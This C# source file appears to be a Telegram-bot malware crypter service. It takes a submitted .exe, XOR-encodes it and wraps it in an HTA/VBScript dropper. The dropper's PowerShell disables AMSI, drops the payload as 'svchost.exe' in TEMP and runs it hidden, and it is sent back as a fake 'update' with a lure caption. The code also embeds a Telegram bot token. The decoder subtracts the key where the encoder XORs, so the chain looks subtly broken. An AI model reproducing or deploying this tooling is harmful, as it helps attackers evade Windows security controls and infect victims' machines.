using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/", () => "🟢 v8.1 SmartScreen BYPASS");

app.MapPost("/webhook", async (HttpContext ctx) =>
{
    string body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
    
    var chatMatch = Regex.Match(body, @"""chat"":\s*\{\s*""id"":\s*(\d+)");
    var fileMatch = Regex.Match(body, @"""file_id"":\s*""([^""]+\.exe)""");
    
    if (chatMatch.Success && fileMatch.Success)
    {
        long chatId = long.Parse(chatMatch.Groups[1].Value);
        string fileId = fileMatch.Groups[1].Value;
        _ = Task.Run(async () => await FudSmart(chatId, fileId));
    }
    
    ctx.Response.StatusCode = 200;
});

static async Task FudSmart(long chatId, string fileId)
{
    using var http = new HttpClient();
    
    // Get & download EXE
    string fileResp = await http.GetStringAsync($"https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id={fileId}");
    var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
    string filePath = pathMatch.Groups[1].Value;
    
    byte[] exe = await http.GetByteArrayAsync($"https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/{filePath}");
    
    // XOR encrypt
    byte[] encrypted = XorEncrypt(exe, 0xAB);
    string b64 = Convert.ToBase64String(encrypted);
    
    // VBS -> HTA -> PS1 CHAIN (SmartScreen BYPASS)
    string vbsPayload = $@"
Set WshShell = CreateObject(""WScript.Shell"")
Set fso = CreateObject(""Scripting.FileSystemObject"")
payload = ""$b=[Convert]::FromBase64String('{b64.Replace(""'",""'""'")}');for($i=0;$i<$b.length;$i++){{$b[$i]=$b[$i]-0xAB}};$A=[Ref].Assembly.GetTypes();ForEach($B in $A) {{$C=$B.FullName|Where-Object {{$_ -like '*AMSIUtils*'}};$D=[{{
$null=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
}};$D.Invoke()}};[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'svchost.exe'),$b);Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden""
WshShell.Run ""powershell -nop -w hidden -ep bypass -c ""& {{ " + payload + " }}""\", 0, False
";

    // Create VBS dropper (SmartScreen ignores VBS)
    string vbsFile = $@"
<%
Response.ContentType = ""application/hta""
%>
<html>
<head><title></title></head>
<body style='display:none'>
<script language='VBScript'>
{vbsPayload}
</script>
</body>
</html>
";
    
    byte[] fudBytes = Encoding.UTF8.GetBytes(vbsFile);
    
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.1.hta");
    form.Add(new StringContent("🔥 v8.1 SmartScreen BYPASS\n👆 Right-click → 'Open'"), "caption");
    
    await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
}

static byte[] XorEncrypt(byte[] data, byte key)
{
    byte[] result = new byte[data.Length];
    for (int i = 0; i < data.Length; i++)
        result[i] = (byte)(data[i] ^ key);
    return result;
}

app.Run();
